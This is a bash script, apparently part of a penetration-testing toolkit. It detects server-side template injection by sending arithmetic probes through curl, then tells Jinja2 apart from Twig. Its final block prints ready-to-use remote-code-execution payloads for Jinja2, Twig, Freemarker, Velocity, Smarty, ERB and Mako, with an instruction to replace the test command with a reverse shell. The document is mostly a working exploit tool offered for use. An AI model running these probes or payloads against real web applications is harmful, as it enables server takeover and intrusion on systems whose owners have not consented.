#!/usr/bin/env bash
# ssti-probe — detect Server-Side Template Injection and identify the engine, then
# print the matching RCE one-liner. Local curl only.
#
# Uses a distinctive product (911*877=798947) so a reflected "798947" = evaluation.
# Then disambiguates Jinja2 vs Twig. You give the request with __I__ for the sink.
#
# Usage:  ./ssti-probe.sh <url> '<data-with-__I__>' [GET|POST]
# Example: ./ssti-probe.sh http://target/greet 'name=__I__' POST
set -uo pipefail
URL="${1:?usage: ssti-probe.sh <url> '<data __I__>' [GET|POST]}"
TMPL="${2:?need data template containing __I__}"
METHOD="${3:-POST}"
HIT="798947"   # 911*877

send(){ local data="${TMPL/__I__/$1}" args=(); IFS='&' read -ra kv <<<"$data"
  for p in "${kv[@]}"; do args+=(--data-urlencode "$p"); done
  if [ "$METHOD" = GET ]; then curl -s --max-time 15 -G "$URL" "${args[@]}"
  else curl -s --max-time 15 "$URL" "${args[@]}"; fi; }

declare -A PROBE=(
  ["{{911*877}}"]="Jinja2/Twig (Python/PHP)"
  ['${911*877}']="Freemarker/Velocity/EL/Mako (Java/Python)"
  ["<%= 911*877 %>"]="ERB (Ruby)"
  ["#{911*877}"]="Ruby / Thymeleaf"
  ['#{911*877}']="Slim/other"
)
echo "[*] probing for evaluation (expect $HIT in the response)"
FOUND=""
for p in "{{911*877}}" '${911*877}' "<%= 911*877 %>" "#{911*877}"; do
  r=$(send "$p")
  if printf '%s' "$r" | grep -qF "$HIT"; then echo "    [HIT] '$p' evaluated -> ${PROBE[$p]:-template engine}"; FOUND="$p"; fi
done
[ -z "$FOUND" ] && { echo "[!] no evaluation. Try other sinks/params, or it isn't SSTI."; exit 0; }

# disambiguate {{ }} engines
if [ "$FOUND" = "{{911*877}}" ]; then
  r=$(send "{{7*'7'}}")
  if printf '%s' "$r" | grep -q "7777777"; then echo "    -> Jinja2 (7*'7'=7777777)"
  elif printf '%s' "$r" | grep -q "49";      then echo "    -> Twig (7*'7'=49)"
  else echo "    -> {{ }} engine (could not disambiguate; try Jinja2 then Twig payloads)"; fi
fi

cat <<'EOF'

[*] RCE one-liners by engine (swap id for your reverse shell once confirmed):
  Jinja2 : {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
  Jinja2 : {{cycler.__init__.__globals__.os.popen('id').read()}}
  Twig   : {{['id']|filter('system')}}
  Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
  Velocity  : #set($e=$x.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))
  Smarty : {system('id')}
  ERB    : <%= `id` %>
  Mako   : ${__import__('os').popen('id').read()}
  (full set: scripts/payloads/ssti.txt)
EOF
